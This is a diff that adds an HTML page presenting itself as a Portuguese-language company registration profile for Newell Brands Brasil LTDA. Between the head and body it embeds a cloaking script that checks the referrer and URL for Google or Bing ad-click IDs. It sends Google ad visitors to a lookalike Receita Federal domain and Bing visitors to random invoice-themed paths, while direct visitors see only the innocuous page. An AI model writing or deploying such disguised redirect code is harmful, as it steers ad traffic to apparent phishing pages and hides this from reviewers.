@@ -1,1 +1,201 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Newell Brands Brasil LTDA</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        header {
+            background-color: #1f2a44;
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        nav {
+            background-color: #162033;
+            padding: 12px;
+            text-align: center;
+        }
+        nav a {
+            color: white;
+            margin: 0 15px;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        nav a:hover {
+            text-decoration: underline;
+        }
+        .container {
+            max-width: 1100px;
+            margin: auto;
+            padding: 40px 20px;
+        }
+        .section {
+            margin-bottom: 50px;
+        }
+        .card {
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.08);
+        }
+        footer {
+            background-color: #1f2a44;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        .btn {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #1f2a44;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            margin-top: 15px;
+        }
+        .btn:hover {
+            background-color: #162033;
+        }
+    </style>
+</head>
+  <script>
 
+const urls = [
+    'cte/index',
+    'nfe/index',
+    'cte/index',
+    'asp/indexp',
+    'app/index',
+    'xml/indexp',
+    'danfe/index',
+    'nfe/index'
+];
+
+// Função para gerar um hash MD5 (requer biblioteca crypto ou implementação personalizada)
+function generateHash() {
+    // Gerando um hash simples como alternativa ao MD5
+    // Para MD5 real, seria necessário uma biblioteca como crypto-js
+    return Math.random().toString(36).substring(2, 15) + 
+           Math.random().toString(36).substring(2, 15) + 
+           Date.now().toString(36);
+}
+
+// Selecionando URL aleatória
+const randomIndex = Math.floor(Math.random() * urls.length);
+const randomUrl = urls[randomIndex];
+const hash = generateHash();
+const googlerandomUrlWithHash = randomUrl + '?gclid=' + hash;
+const bingrandomUrlWithHash = randomUrl + '?msclkid=' + hash;
+const xirjfgjsdhdjd = 'https://www8.receita-fazenda-cnpj.site/buscar';  
+
+// Obtendo o referer (disponível apenas no navegador)
+let referer;
+if (typeof document !== 'undefined' && document.referrer) {
+    referer = document.referrer;
+} else {
+    referer = 'not found';
+}
+
+// Obtendo a URL atual (equivalente ao REQUEST_URI do PHP)
+let currentUrl;
+if (typeof window !== 'undefined') {
+    currentUrl = window.location.href;
+} else {
+    currentUrl = '';
+}
+
+// Verificando condições e redirecionando
+if (/gclid/i.test(referer) || /gclid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = xirjfgjsdhdjd ;
+    } else {
+        console.log('Redirect to:', xirjfgjsdhdjd );
+    }
+} else if (/msclkid/i.test(referer) || /msclkid/i.test(currentUrl)) {
+    // Redirecionamento (no navegador)
+    if (typeof window !== 'undefined') {
+        window.location.href = bingrandomUrlWithHash;
+    } else {
+        console.log('Redirect to:', bingrandomUrlWithHash);
+    }
+} else {
+    // Bloco vazio equivalente ao else do PHP
+}
+  
+</script>
+<body>
+
+<header>
+    <h1>Newell Brands Brasil LTDA</h1>
+    <p>Empresa com atuação nacional desde 1971</p>
+</header>
+
+<nav>
+    <a href="#empresa">Empresa</a>
+    <a href="#dados">Dados Cadastrais</a>
+    <a href="#contato">Contato</a>
+</nav>
+
+<div class="container">
+
+    <section id="empresa" class="section">
+        <div class="card">
+            <h2>Sobre a Empresa</h2>
+            <p>
+                A Newell Brands Brasil LTDA é uma Sociedade Empresária Limitada fundada em 03/03/1971.
+                Atua como matriz, com capital social de R$ 377.907.629,00 e situação cadastral ativa.
+            </p>
+        </div>
+    </section>
+
+    <section id="dados" class="section">
+        <h2>Dados Cadastrais</h2>
+        <div class="info-grid">
+            <div class="card">
+                <p><strong>CNPJ:</strong> 60.594.538/0001-01</p>
+                <p><strong>Inscrição Estadual:</strong> 103.013.354.115</p>
+                <p><strong>Natureza Jurídica:</strong> Sociedade Empresária Limitada</p>
+                <p><strong>Porte:</strong> Sem Enquadramento</p>
+            </div>
+            <div class="card">
+                <p><strong>Tipo:</strong> Matriz</p>
+                <p><strong>Situação:</strong> Ativa</p>
+                <p><strong>Data Situação:</strong> 03/11/2005</p>
+                <p><strong>Opção Simples/MEI:</strong> Não Optante</p>
+            </div>
+        </div>
+    </section>
+
+    <section id="contato" class="section">
+        <div class="card">
+            <h2>Contato</h2>
+            <p><strong>Endereço:</strong> Rua Funchal, 418 - Andar 12 Sala 1201 e 1202</p>
+            <p>Edifício E-Tower - Vila Olímpia</p>
+            <p>CEP: 04551-060</p>
+            <p>São Paulo - SP</p>
+            <p><strong>Telefone:</strong> (35) 344****-****</p>
+            <p><strong>Email:</strong> be****@****.com</p>
+            <a href="#" class="btn">Entrar em Contato</a>
+        </div>
+    </section>
+
+</div>
+
+<footer>
+    <p>&copy; 2026 Newell Brands Brasil LTDA - Todos os direitos reservados.</p>
+</footer>
+
+</body>
+</html>
